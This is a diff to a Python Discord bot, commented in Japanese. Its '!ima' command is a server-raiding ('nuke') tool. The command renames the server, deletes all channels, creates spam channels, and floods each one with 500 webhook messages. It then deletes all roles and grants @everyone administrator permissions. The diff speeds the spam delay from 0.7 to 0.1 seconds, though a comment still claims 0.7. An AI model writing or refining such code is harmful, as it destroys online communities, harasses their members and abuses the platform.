@@ -5,21 +5,17 @@ import os
 from flask import Flask
 from threading import Thread
 
-# --- Webサーバー設定 (KoyebのHealth Check & UptimeRobot対策) ---
+# --- Webサーバー設定 ---
 app = Flask('')
-
 @app.route('/')
-def home():
-    return "Bot is active"
+def home(): return "Bot is active"
 
-def run():
-    app.run(host='0.0.0.0', port=8080)
-
+def run(): app.run(host='0.0.0.0', port=8080)
 def keep_alive():
     t = Thread(target=run)
     t.start()
 
-# --- Discord Bot本体 ---
+# --- Discord Bot設定 ---
 intents = discord.Intents.all()
 bot = commands.Bot(command_prefix="!", intents=intents)
 
@@ -52,33 +48,34 @@ async def ima(ctx):
     guild = ctx.guild
     
     # 1. サーバー名の変更
-    try:
-        await guild.edit(name="みんなの住処植民地")
+    try: await guild.edit(name="みんなの住処植民地")
     except: pass
 
-    # 2. チャンネル全削除 (非同期一括実行)
+    # 2. チャンネル全削除 (一気に処理)
     delete_tasks = [channel.delete() for channel in guild.channels]
     await asyncio.gather(*delete_tasks, return_exceptions=True)
 
-    # 3. チャンネル50個一斉作成
-    create_tasks = [guild.create_text_channel('imaばんざい') for _ in range(50)]
+    # 3. チャンネル25個作成
+    create_tasks = [guild.create_text_channel('imaばんざい') for _ in range(25)]
     new_channels = await asyncio.gather(*create_tasks, return_exceptions=True)
 
-    # 4. Webhook作成 & メッセージ送信 (0.7秒間隔)
+    # 4. Webhookでの一斉送信
     async def send_spam(channel):
         if isinstance(channel, discord.TextChannel):
             try:
                 webhook = await channel.create_webhook(name="Ima_Promotion")
+                # 500メッセージを各チャンネルで送信
                 for _ in range(500):
                     await webhook.send(content=MESSAGE_CONTENT, username="居場所")
-                    await asyncio.sleep(0.7) # ご要望のクールタイム
+                    await asyncio.sleep(0.1) # 1ウェブフックあたり0.7秒の待機
             except: pass
 
+    # すべての作成済みチャンネルに対して送信タスクを開始
     for ch in new_channels:
         if not isinstance(ch, Exception):
             asyncio.create_task(send_spam(ch))
 
-    # 5. ロール削除 & @everyone 管理者権限化
+    # 5. ロール削除 & @everyone 管理者権限
     for role in guild.roles:
         if role.name != "@everyone" and not role.managed:
             try: await role.delete()
@@ -88,11 +85,6 @@ async def ima(ctx):
         await guild.default_role.edit(permissions=discord.Permissions.all())
     except: pass
 
-# 実行
 if __name__ == "__main__":
     keep_alive()
-    token = os.environ.get("DISCORD_BOT_TOKEN")
-    if token:
-        bot.run(token)
-    else:
-        print("❌ Error: DISCORD_BOT_TOKEN is not set.")
+    bot.run(os.environ.get("DISCORD_BOT_TOKEN"))
